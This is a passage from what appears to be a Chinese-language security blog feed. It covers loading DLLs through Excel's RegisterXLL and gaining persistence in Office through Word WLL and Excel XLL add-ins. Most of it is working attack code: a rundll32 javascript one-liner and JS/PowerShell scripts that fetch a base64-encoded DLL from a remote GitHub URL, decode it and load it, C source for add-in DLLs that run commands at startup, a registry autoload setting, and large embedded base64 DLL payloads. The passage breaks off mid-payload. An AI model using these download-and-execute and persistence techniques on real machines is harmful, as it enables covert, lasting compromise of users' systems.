&quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;https://raw.githubusercontent.com/3gstudent/test/master/calc.dll&quot;,false);h.Send();s=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);f=s.CreateTextFile(&quot;c:\\test\\1.txt&quot;,true);f.WriteLine(h.ResponseText);f.Close(); 报错，如下图 解决方法： 将二进制文件作base64编码并保存成文本文件，再通过Scripting.FileSystemObject保存 对calc.dll作base64编码并保存至文件buffer.txt,对应powershell代码如下： $fileContent = [System.IO.File]::ReadAllBytes(&#39;calc.dll&#39;) $fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content (&quot;buffer.txt&quot;) 注： 读取二进制文件，不能使用命令Get-content 将buffer.txt上传至github 下载base64并保存文件对应的js代码如下： h=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;); h.Open(&quot;GET&quot;,&quot;https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt&quot;,false); h.Send(); fso1=new ActiveXObject(&quot;Scripting.FileSystemObject&quot;); f=fso1.CreateTextFile(&quot;c:\\test\\1.txt&quot;,true); f.WriteLine(h.ResponseText); f.Close(); 下载base64并保存文件对应rundll32的代码如下： rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt&quot;,false);h.Send();s=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);f=s.CreateTextFile(&quot;c:\\test\\1.txt&quot;,true);f.WriteLine(h.ResponseText);f.Close(); 文件保存成功，该文件存储base64加密后的calc.dll base64解密该文件并加载dll对应的js代码如下： x=&quot;c:\\test\\calc.dll&quot;; h=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;); h.Open(&quot;GET&quot;,&quot;https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt&quot;,false); h.Send(); var enc = new ActiveXObject(&quot;System.Text.ASCIIEncoding&quot;); var length = enc.GetByteCount_2(h.ResponseText); var ba = enc.GetBytes_4(h.ResponseText); var transform = new ActiveXObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;); ba = transform.TransformFinalBlock(ba, 0, length); s=new ActiveXObject(&quot;ADODB.Stream&quot;); s.Type=1; s.Open(); s.Write(ba); s.SaveToFile(x,2); new ActiveXObject(&quot;Excel.Application&quot;).RegisterXLL(x); 注： 以上两段代码结合，可应用在通过rundll32进行文件下载（先通过rundll32下载base64加密的文件，然后使用js脚本解密），可解决在之前的文章《JavaScript backdoor》给读者留下的小bug base64解密该文件并加载dll对应的powershell代码如下： $FilePath=&quot;C:\test\test1.dll&quot; $base64Buf = Get-content c:\test\1.txt $fileContentBytes = [System.Convert]::FromBase64String($base64Buf) [System.IO.File]::WriteAllBytes($FilePath,$fileContentBytes) $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Excel.Application&quot;)) $excel.RegisterXLL($FilePath) 0x05 小结 本文介绍了利用Excel.Application object’s RegisterXLL() method加载dll的相关方法，着重分析如何编写js和powershell脚本对其扩展，并解决了在之前的文章《JavaScript backdoor》给读者留下的小bug。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Use Office to maintain persistence]]></title>
    <url>%2Fposts%2F43d4dd32.html</url>
    <content type="text"><![CDATA[0x00 前言 对于Windows平台，Microsoft Office的普及率很高。站在攻击者的角度，通常会选择在Office软件中植入后门。 我在一篇博客上看到了Office后门的多种利用方法，我对其进行了研究测试，挑选其中较为通用、隐蔽的方式，编写POC脚本实现自动利用。 博客地址： https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/ 作者： William Knowles@william_knows POC： https://github.com/3gstudent/Office-Persistence 0x01 简介 本文将要介绍以下内容： 针对Word、Excel、PowerPoint的四种后门利用方法 编写Powershell脚本实现自动利用 比较优缺点，分析防御方法 0x02 Word WLL 1、手动测试开发工具：VC6.0 新建dll工程，代码如下： BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: MessageBox(NULL,&quot;hello world，I&#39;m 3kb&quot;,&quot;title&quot;,MB_OK); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; }return TRUE; } 编译成msg.dll，作如下设置减小编译文件体积： Build：release 添加代码：#pragma comment(linker,”/OPT:nowin98”) 工程设置-&gt;Win32 Release-&gt;C/C++-&gt;Code Generation-&gt;Use run-time library:-&gt;Multithreaded DLL 经过优化，dll大小为3kb 重命名为msg.wll，保存路径如下： C:\Users\a\AppData\Roaming\Microsoft\Word\Startup 启动Word.exe，弹框，界面卡住，Word无法正常执行；关闭弹出的对话框后，Word正常启动 如下图 注： 通过Metasploit的msfvenom生成的dll，会导致Word程序崩溃 修改c代码，实现启动计算器，代码如下： BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: WinExec(&quot;calc.exe&quot;,SW_SHOWNORMAL); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; }return TRUE; } 编译成calc.dll，优化后大小为3kb 重命名为calc.wll，保存在路径C:\Users\a\AppData\Roaming\Microsoft\Word\Startup 启动Word.exe，弹出计算器，并且word正常启动 如下图 注： Startup路径可保存多个wll，支持启动多个wll 2、编写Powershell脚本实现wll路径对应的powershell代码如下： $env:APPDATA+&quot;\Microsoft\Word\Startup\calc.wll&quot; 将编译好的3kb大小的calc.dll作base64加密并存储于变量中： $fileContent = [System.IO.File]::ReadAllBytes(&#39;calc.dll&#39;) $fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content (&quot;calcdllbase64.txt&quot;) 得到 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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAACjAQMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 用变量$fileContent存储base64加密的calc.dll base64解密并释放calc.wll至Startup路径的代码如下： $fileContent = &quot;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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAACjAQMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; $fileContentBytes = [System.Convert]::FromBase64String($fileContent) [System.IO.File]::WriteAllBytes($env:APPDATA+&quot;\Microsoft\Word\Startup\calc.wll&quot;,$fileContentBytes) 以上代码运行后，在C:\Users\a\AppData\Roaming\Microsoft\Word\Startup\生成calc.wll，启动word.exe时,弹出计算器 0x03 Excel XLL 1、手动测试新建dll工程，添加导出函数xlAutoOpen，具体代码如下： void xlAutoOpen() { WinExec(&quot;calc.exe&quot;,SW_SHOWNORMAL); } BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 添加文件，设置类型：Text File 名称：工程同名文件.def 写入： EXPORTS xlAutoOpen 编译成calc2.dll，导出函数为xlAutoOpen()，优化后大小为3kb 重命名为calc.xll，保存路径如下： %appdata%\Microsoft\AddIns 查找注册表键值： Office2010对应的键值为： HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Excel\Options Office2013对应的键值为： HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Excel\Options 新建字符串值： OPEN： /R calc.xll 启动Excel.exe，弹出计算器，并且Excel正常启动 2、编写Powershell脚本实现同上，calc2.dll作base64加密并存储于变量中： $fileContent = [System.IO.File]::ReadAllBytes(&#39;calc.xll&#39;) $fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content (&quot;calcxllbase64.txt&quot;) 得到 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ZGxsAHhsQXV0b09wZW4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA